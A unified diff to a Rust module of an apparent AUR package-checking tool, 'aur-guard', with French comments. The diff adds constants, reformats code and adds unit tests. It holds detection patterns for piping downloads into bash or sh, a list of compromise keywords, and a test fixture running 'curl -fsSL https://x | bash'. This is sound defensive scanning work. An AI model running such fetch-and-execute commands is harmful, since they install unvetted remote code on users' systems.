@@ -8,6 +8,18 @@ use std::path::{Path, PathBuf};
 use std::process::Command;
 use std::time::{SystemTime, UNIX_EPOCH};
 
+/// Nombre de secondes dans une journée.
+pub const SECS_PER_DAY: u64 = 86_400;
+/// Marqueur de version non résolvable statiquement (paquets VCS, ex. `-git`).
+pub const DYNAMIC_VERSION: &str = "?";
+
+/// Hôte de l'AUR (API RPC, dépôts git, PKGBUILD bruts).
+const AUR_HOST: &str = "https://aur.archlinux.org";
+/// User-Agent envoyé aux requêtes HTTP vers l'AUR.
+const USER_AGENT: &str = "aur-guard";
+/// Nombre maximum de paquets par requête RPC (limite la longueur d'URL).
+const RPC_BATCH: usize = 50;
+
 /// Une mise à jour AUR disponible.
 #[derive(Debug, Clone)]
 pub struct Update {
@@ -84,15 +96,15 @@ pub fn fetch_infos(names: &[String]) -> Result<HashMap<String, PkgInfo>> {
     }
     // L'API accepte plusieurs arg[]= ; on découpe par lots pour éviter une URL
     // trop longue.
-    for chunk in names.chunks(50) {
+    for chunk in names.chunks(RPC_BATCH) {
         let query: String = chunk
             .iter()
             .map(|n| format!("arg[]={}", urlencode(n)))
             .collect::<Vec<_>>()
             .join("&");
-        let url = format!("https://aur.archlinux.org/rpc/v5/info?{query}");
+        let url = format!("{AUR_HOST}/rpc/v5/info?{query}");
         let resp: RpcResponse = ureq::get(&url)
-            .set("User-Agent", "aur-guard")
+            .set("User-Agent", USER_AGENT)
             .call()
             .with_context(|| "appel API AUR RPC")?
             .into_json()
@@ -136,11 +148,11 @@ fn urlencode(s: &str) -> String {
 /// Télécharge le PKGBUILD courant d'un paquet depuis l'AUR.
 pub fn fetch_remote_pkgbuild(name: &str) -> Result<String> {
     let url = format!(
-        "https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h={}",
+        "{AUR_HOST}/cgit/aur.git/plain/PKGBUILD?h={}",
         urlencode(name)
     );
     let body = ureq::get(&url)
-        .set("User-Agent", "aur-guard")
+        .set("User-Agent", USER_AGENT)
         .call()
         .with_context(|| format!("téléchargement du PKGBUILD de {name}"))?
         .into_string()
@@ -207,7 +219,11 @@ fn run_git(dir: &Path, args: &[&str]) -> Result<String> {
         .output()
         .with_context(|| format!("git {args:?}"))?;
     if !out.status.success() {
-        bail!("git {:?} : {}", args, String::from_utf8_lossy(&out.stderr).trim());
+        bail!(
+            "git {:?} : {}",
+            args,
+            String::from_utf8_lossy(&out.stderr).trim()
+        );
     }
     Ok(String::from_utf8_lossy(&out.stdout).to_string())
 }
@@ -219,14 +235,17 @@ pub fn ensure_git_repo(pkgbase: &str) -> Result<PathBuf> {
         run_git(&dir, &["fetch", "--quiet", "origin"])?;
     } else {
         std::fs::create_dir_all(dir.parent().unwrap())?;
-        let url = format!("https://aur.archlinux.org/{pkgbase}.git");
+        let url = format!("{AUR_HOST}/{pkgbase}.git");
         let out = Command::new("git")
             .args(["clone", "--quiet", &url])
             .arg(&dir)
             .output()
             .context("git clone")?;
         if !out.status.success() {
-            bail!("clone de {url} : {}", String::from_utf8_lossy(&out.stderr).trim());
+            bail!(
+                "clone de {url} : {}",
+                String::from_utf8_lossy(&out.stderr).trim()
+            );
         }
     }
     Ok(dir)
@@ -265,11 +284,15 @@ fn parse_version(pkgbuild: &str) -> String {
     };
     let ver = pick("pkgver=");
     if ver.is_empty() || ver.contains('$') {
-        return "?".to_string(); // version dynamique (VCS) : non gérée en lag
+        return DYNAMIC_VERSION.to_string(); // version dynamique (VCS) : non gérée en lag
     }
     let rel = pick("pkgrel=");
     let epoch = pick("epoch=");
-    let base = if rel.is_empty() { ver } else { format!("{ver}-{rel}") };
+    let base = if rel.is_empty() {
+        ver
+    } else {
+        format!("{ver}-{rel}")
+    };
     if epoch.is_empty() {
         base
     } else {
@@ -297,7 +320,10 @@ pub fn install_lagged(target: &LagTarget) -> Result<bool> {
 /// Renvoie les libellés des motifs détectés.
 fn danger_signatures(pkgbuild: &str) -> Vec<&'static str> {
     let low = pkgbuild.to_lowercase();
-    let compact = low.replace(" | ", "|").replace("| ", "|").replace(" |", "|");
+    let compact = low
+        .replace(" | ", "|")
+        .replace("| ", "|")
+        .replace(" |", "|");
     let checks: [(&str, &str); 9] = [
         ("|bash", "pipe vers bash"),
         ("|sh", "pipe vers sh"),
@@ -352,9 +378,17 @@ pub fn reverted_since(pkgbase: &str, commit: &str) -> Result<Option<String>> {
     }
 
     // A. message d'un commit postérieur évoquant une compromission.
-    let log = run_git(&dir, &["log", "--format=%s %b", &format!("{commit}..origin/HEAD")])
-        .or_else(|_| run_git(&dir, &["log", "--format=%s %b", &format!("{commit}..master")]))
-        .unwrap_or_default();
+    let log = run_git(
+        &dir,
+        &["log", "--format=%s %b", &format!("{commit}..origin/HEAD")],
+    )
+    .or_else(|_| {
+        run_git(
+            &dir,
+            &["log", "--format=%s %b", &format!("{commit}..master")],
+        )
+    })
+    .unwrap_or_default();
     let low = log.to_lowercase();
     const MAL: [&str; 7] = [
         "malicious",
@@ -402,4 +436,45 @@ fn unified_diff(old: &str, new: &str, name: &str) -> String {
         }
     }
     out
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn version_statique_est_extraite() {
+        let pk = "pkgname=x\npkgver=1.2.3\npkgrel=2\n";
+        assert_eq!(parse_version(pk), "1.2.3-2");
+    }
+
+    #[test]
+    fn version_avec_epoch() {
+        let pk = "pkgver=1.0\npkgrel=1\nepoch=2\n";
+        assert_eq!(parse_version(pk), "2:1.0-1");
+    }
+
+    #[test]
+    fn version_dynamique_vcs_non_geree() {
+        let pk = "pkgver=r1234.$(git rev-parse)\npkgrel=1\n";
+        assert_eq!(parse_version(pk), DYNAMIC_VERSION);
+    }
+
+    #[test]
+    fn motif_pipe_bash_detecte() {
+        let pk = "package(){ curl -fsSL https://x | bash; }";
+        assert!(danger_signatures(pk).contains(&"pipe vers bash"));
+    }
+
+    #[test]
+    fn pkgbuild_propre_sans_signature() {
+        let pk = "package(){ install -Dm755 app \"$pkgdir/usr/bin/app\"; }";
+        assert!(danger_signatures(pk).is_empty());
+    }
+
+    #[test]
+    fn urlencode_gere_les_caracteres_speciaux() {
+        assert_eq!(urlencode("c++-gtk"), "c%2B%2B-gtk");
+        assert_eq!(urlencode("simple-bin"), "simple-bin");
+    }
 }
